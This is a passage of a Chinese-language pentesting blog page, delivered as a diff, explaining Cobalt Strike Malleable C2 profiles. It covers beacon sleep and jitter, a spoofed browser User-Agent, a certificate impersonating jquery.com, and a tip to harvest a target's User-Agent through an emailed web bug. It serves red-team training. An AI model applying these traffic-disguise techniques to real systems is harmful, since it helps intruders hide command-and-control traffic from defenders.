@@ -1,0 +1,1368 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Cobalt Strike Basic No.3 -- Malleable C2 Profile - V4ler1an</title><meta name="Description" content="CS基础知识记录"><meta property="og:title" content="Cobalt Strike Basic No.3 -- Malleable C2 Profile" />
+<meta property="og:description" content="CS基础知识记录" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.3/" /><meta property="og:image" content="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.3/cs.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-01-17T05:57:40+08:00" />
+<meta property="article:modified_time" content="2024-01-18T06:59:40+08:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.3/cs.png" /><meta name="twitter:title" content="Cobalt Strike Basic No.3 -- Malleable C2 Profile"/>
+<meta name="twitter:description" content="CS基础知识记录"/>
+<meta name="twitter:site" content="@YaoyaoShaw"/>
+<meta name="application-name" content="V4ler1an">
+<meta name="apple-mobile-web-app-title" content="V4ler1an"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.3/" /><link rel="prev" href="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.2/" /><link rel="next" href="https://www.v4ler1an.com/2024/02/c2%E9%9A%90%E8%97%8F%E9%9A%8F%E7%AC%94/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Cobalt Strike Basic No.3 -- Malleable C2 Profile",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.v4ler1an.com\/2024\/01\/cobalt_strike_basic_no.3\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/www.v4ler1an.com\/2024\/01\/cobalt_strike_basic_no.3\/cs.png",
+                            "width":  425 ,
+                            "height":  119 
+                        }],"genre": "posts","keywords": "C2","wordcount":  6186 ,
+        "url": "https:\/\/www.v4ler1an.com\/2024\/01\/cobalt_strike_basic_no.3\/","datePublished": "2024-01-17T05:57:40+08:00","dateModified": "2024-01-18T06:59:40+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/www.v4ler1an.com\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "v4ler1an"
+            },"description": "CS基础知识记录"
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="V4ler1an"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/personal_logo.png"
+        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
+        data-sizes="auto"
+        alt="/images/personal_logo.png"
+        title="/images/personal_logo.png" />V4ler1an</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 我 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/2024/01/cobalt_strike_basic_no.3/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="V4ler1an"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/personal_logo.png"
+        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
+        data-sizes="auto"
+        alt="/images/personal_logo.png"
+        title="/images/personal_logo.png" />V4ler1an</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">我</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/2024/01/cobalt_strike_basic_no.3/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Cobalt Strike Basic No.3 -- Malleable C2 Profile</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://www.v4ler1an.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>v4ler1an</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/pentesting/"><i class="far fa-folder fa-fw"></i>Pentesting</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-01-17">2024-01-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 6186 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 13 分钟&nbsp;<span id="/2024/01/cobalt_strike_basic_no.3/" class="leancloud_visitors" data-flag-title="Cobalt Strike Basic No.3 -- Malleable C2 Profile">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+                    </span>&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/2024/01/cobalt_strike_basic_no.3/cs.png"
+        data-srcset="/2024/01/cobalt_strike_basic_no.3/cs.png, /2024/01/cobalt_strike_basic_no.3/cs.png 1.5x, /2024/01/cobalt_strike_basic_no.3/cs.png 2x"
+        data-sizes="auto"
+        alt="/2024/01/cobalt_strike_basic_no.3/cs.png"
+        title="CS基础知识记录" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#malleable-c2-profile">Malleable C2 Profile</a>
+      <ul>
+        <li><a href="#profile-name">Profile Name</a></li>
+        <li><a href="#sleep-time">sleep time</a></li>
+        <li><a href="#user-agent">User-Agent</a></li>
+        <li><a href="#ssl证书">SSL证书</a></li>
+        <li><a href="#http-beacon">HTTP Beacon</a></li>
+        <li><a href="#tcp-beacon">TCP Beacon</a></li>
+        <li><a href="#smb-beacon">SMB Beacon</a></li>
+        <li><a href="#dns-beacon">DNS Beacon</a></li>
+        <li><a href="#staging-process">Staging process</a></li>
+        <li><a href="#post-exploitation">Post Exploitation</a></li>
+        <li><a href="#memory-indicator">Memory Indicator</a></li>
+        <li><a href="#http-headers">HTTP Headers</a></li>
+        <li><a href="#http-get">HTTP GET</a></li>
+        <li><a href="#http-post">HTTP POST</a></li>
+        <li><a href="#生成方式">生成方式</a></li>
+        <li><a href="#说明">说明</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>体系化总结一下Cobalt Strike的基本知识和使用，主要面向新手，希望可以快速上手该工具，建立系统化知识结构。</p>
+<h2 id="malleable-c2-profile">Malleable C2 Profile</h2>
+<p>beacon的http通信方式是由Malleable C2 Profile来控制的，它可以指定如何传输和保存数据。每个CS只能加载一个profile。在加载profile之前，使用<code>c2lint</code>对profile进行错误检查。</p>
+<p>通过修改profile中的各种值，就可以实现修改beacon的内存占用、修改网络流量等。</p>
+<p>使用命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./teamserver <span class="o">[</span>external IP<span class="o">]</span> <span class="o">[</span>password<span class="o">]</span> <span class="o">[</span>/path/to/my.profile<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>检查错误：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./c2lint <span class="o">[</span>/path/to/my.profile<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>c2lint returns and logs the following result codes for the specified profile file:</p>
+<ul>
+<li>A result of 0 is returned if c2lint completes with no errors</li>
+<li>A result of 1 is returned if c2lint completes with only warnings</li>
+<li>A result of 2 is returned if c2lint completes with only errors</li>
+<li>A result of 3 is returned if c2lint completes with both errors and warnings</li>
+</ul>
+<p>下面使用https://github.com/threatexpress/malleable-c2的profile作为示例来详细说明profile的相关结构内容，该profile旨在模拟jQuery请求。</p>
+<h3 id="profile-name">Profile Name</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Profile</span> <span class="err">Name</span>
+</span></span><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Description:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">The</span> <span class="err">name</span> <span class="err">of</span> <span class="err">this</span> <span class="err">profile</span> <span class="err">(used</span> <span class="err">in</span> <span class="err">the</span> <span class="err">Indicators</span> <span class="err">of</span> <span class="err">Compromise</span> <span class="err">report)</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Defaults:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">sample_name:</span> <span class="err">My</span> <span class="err">Profile</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Guidelines:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">Choose</span> <span class="err">a</span> <span class="err">name</span> <span class="err">that</span> <span class="err">you</span> <span class="err">want</span> <span class="err">in</span> <span class="err">a</span> <span class="err">report</span>
+</span></span><span class="line"><span class="cl"><span class="err">set</span> <span class="err">sample_name</span> <span class="s2">&#34;jQuery CS 4.9 Profile&#34;</span><span class="err">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>profile name不会影响beacon的流量或者其在目标上的占用空间，而是会在最后的报告中看到使用的profile名字。</p>
+<h3 id="sleep-time">sleep time</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Sleep</span> <span class="err">Times</span>
+</span></span><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Description:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">Timing</span> <span class="err">between</span> <span class="err">beacon</span> <span class="err">check</span> <span class="err">in</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Defaults:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">sleeptime:</span> <span class="mi">60000</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">jitter:</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Guidelines:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">Beacon</span> <span class="err">Timing</span> <span class="err">in</span> <span class="err">milliseconds</span> <span class="err">(</span><span class="mi">1000</span> <span class="err">=</span> <span class="mi">1</span> <span class="err">sec)</span>
+</span></span><span class="line"><span class="cl"><span class="err">set</span> <span class="err">sleeptime</span> <span class="s2">&#34;45000&#34;</span><span class="err">;</span>         <span class="err">#</span> <span class="mi">45</span> <span class="err">Seconds</span>
+</span></span><span class="line"><span class="cl"><span class="err">#set</span> <span class="err">sleeptime</span> <span class="s2">&#34;300000&#34;</span><span class="err">;</span>       <span class="err">#</span> <span class="mi">5</span> <span class="err">Minutes</span>
+</span></span><span class="line"><span class="cl"><span class="err">#set</span> <span class="err">sleeptime</span> <span class="s2">&#34;600000&#34;</span><span class="err">;</span>      <span class="err">#</span> <span class="mi">10</span> <span class="err">Minutes</span>
+</span></span><span class="line"><span class="cl"><span class="err">#set</span> <span class="err">sleeptime</span> <span class="s2">&#34;900000&#34;</span><span class="err">;</span>      <span class="err">#</span> <span class="mi">15</span> <span class="err">Minutes</span>
+</span></span><span class="line"><span class="cl"><span class="err">#set</span> <span class="err">sleeptime</span> <span class="s2">&#34;1200000&#34;</span><span class="err">;</span>      <span class="err">#</span> <span class="mi">20</span> <span class="err">Minutes</span>
+</span></span><span class="line"><span class="cl"><span class="err">#set</span> <span class="err">sleeptime</span> <span class="s2">&#34;1800000&#34;</span><span class="err">;</span>      <span class="err">#</span> <span class="mi">30</span> <span class="err">Minutes</span>
+</span></span><span class="line"><span class="cl"><span class="err">#set</span> <span class="err">sleeptime</span> <span class="s2">&#34;3600000&#34;</span><span class="err">;</span>      <span class="err">#</span> <span class="mi">1</span> <span class="err">Hours</span>
+</span></span><span class="line"><span class="cl"><span class="err">set</span> <span class="err">jitter</span>    <span class="s2">&#34;37&#34;</span><span class="err">;</span>            <span class="err">#</span> <span class="err">%</span> <span class="err">jitter</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>设置beacon的check in的时间，毫秒为单位。在生成新的http/s beacon时，会使用sleep时间作为其回调时间间隔进行check in，然后再加上由jitter（抖动）指定的随机事件。</p>
+<h3 id="user-agent">User-Agent</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Beacon User-Agent</span>
+</span></span><span class="line"><span class="cl"><span class="c1">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Description:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##    User-Agent string used in HTTP requests, CS versions &lt; 4.2 approx 128 max characters, CS 4.2+ max 255 characters</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Defaults:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##    useragent: Internet Explorer (Random)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Guidelines</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##    - Use a User-Agent values that fits with your engagement</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##    - useragent can only be 128 chars</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## IE 10</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># set useragent &#34;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)&#34;;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## MS IE 11 User Agent</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> useragent <span class="s2">&#34;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>实战时，可以尝试从目标捕获一个真实的ua值并插入流量中。例如，向目标发送一封袋有web漏洞的电子邮件并监控后续get请求中发送的ua值。如果使用的是明文的http琉璃那个或者目标环境中存在ssl拦截，那么与环境不匹配的ua就会被目标发现。</p>
+<h3 id="ssl证书">SSL证书</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## SSL CERTIFICATE</span>
+</span></span><span class="line"><span class="cl"><span class="c1">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Description:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##    Signed or self-signed TLS/SSL Certifcate used for C2 communication using an HTTPS listener</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Defaults:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##    All certificate values are blank</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Guidelines:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##    - Best Option - Use a certifcate signed by a trusted certificate authority</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##    - Ok Option - Create your own self signed certificate</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##    - Option - Set self-signed certificate values</span>
+</span></span><span class="line"><span class="cl">https-certificate <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">## Option 1) Trusted and Signed Certificate</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">## Use keytool to create a Java Keystore file. </span>
+</span></span><span class="line"><span class="cl">    <span class="c1">## Refer to https://www.cobaltstrike.com/help-malleable-c2#validssl</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">## or https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh</span>
+</span></span><span class="line"><span class="cl">   
+</span></span><span class="line"><span class="cl">    <span class="c1">## Option 2) Create your own Self-Signed Certificate</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">## Use keytool to import your own self signed certificates</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">#set keystore &#34;/pathtokeystore&#34;;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#set password &#34;password&#34;;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">## Option 3) Cobalt Strike Self-Signed Certificate</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">set</span> C   <span class="s2">&#34;US&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">set</span> CN  <span class="s2">&#34;jquery.com&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">set</span> O   <span class="s2">&#34;jQuery&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">set</span> OU  <span class="s2">&#34;Certificate Authority&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">set</span> validity <span class="s2">&#34;365&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>设置https beacon通信使用的TLS/SSL证书。这里官方给出的建议是可以使用keytool生成一个java的keystore文件，或者生成一个自签名的证书。其中<code>set keystore</code>指定使用的*.store文件，<code>set password</code>指定生成证书时设置的密码。详细的证书生成可以参考<a href="https://www.v4ler1an.com/2024/02/c2%e9%9a%90%e8%97%8f%e9%9a%8f%e7%ac%94/" target="_blank" rel="noopener noreffer">CS隐藏随笔</a>。</p>
+<h3 id="http-beacon">HTTP Beacon</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">HTTP</span> <span class="err">Beacon</span>
+</span></span><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Description:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>   <span class="err">Allows</span> <span class="err">you</span> <span class="err">to</span> <span class="err">specify</span> <span class="err">attributes</span> <span class="err">for</span> <span class="err">general</span> <span class="err">attributes</span> <span class="err">for</span> <span class="err">the</span> <span class="err">http(s)</span> <span class="err">beacons.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Values:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">library</span>       <span class="err">wininet</span>             <span class="err">CS</span> <span class="mf">4.9</span> <span class="err">-</span> <span class="err">The</span> <span class="err">library</span> <span class="err">attribute</span> <span class="err">allows</span> <span class="err">user</span> <span class="err">to</span> <span class="err">specify</span> <span class="err">the</span> <span class="err">default</span> <span class="err">library</span> <span class="err">used</span> <span class="err">by</span> <span class="err">the</span> <span class="err">generated</span> <span class="err">beacons</span> <span class="err">used</span> <span class="err">by</span> <span class="err">the</span> <span class="err">profile.</span> <span class="err">The</span> <span class="err">library</span> <span class="err">defaults</span> <span class="err">to</span> <span class="s2">&#34;wininet&#34;</span><span class="err">,</span> <span class="err">which</span> <span class="err">is</span> <span class="err">the</span> <span class="err">only</span> <span class="err">type</span> <span class="err">of</span> <span class="err">beacon</span> <span class="err">prior</span> <span class="err">to</span> <span class="err">version</span> <span class="mf">4.9</span><span class="err">.</span> <span class="err">The</span> <span class="err">library</span> <span class="err">value</span> <span class="err">can</span> <span class="err">be</span> <span class="s2">&#34;wininet&#34;</span> <span class="err">or</span> <span class="s2">&#34;winhttp&#34;</span><span class="err">.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>
+</span></span><span class="line"><span class="cl"><span class="err">http-beacon</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">Change</span> <span class="err">the</span> <span class="err">default</span> <span class="err">HTTP</span> <span class="err">Beacon</span> <span class="err">library</span> <span class="err">type</span> <span class="err">used</span> <span class="err">by</span> <span class="err">the</span> <span class="err">generated</span> <span class="err">beacons</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">library</span> <span class="nt">&#34;winhttp&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>指定http beacon使用的library，4.9版本支持wininet和winhttp两种，默认使用winhttp。</p>
+<h3 id="tcp-beacon">TCP Beacon</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">TCP</span> <span class="err">Beacon</span>
+</span></span><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Description:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">TCP</span> <span class="err">Beacon</span> <span class="err">listen</span> <span class="err">port</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>     <span class="err">-</span> <span class="err">https:</span><span class="c1">//blog.cobaltstrike.com/2019/01/02/cobalt-strike-3-13-why-do-we-argue/
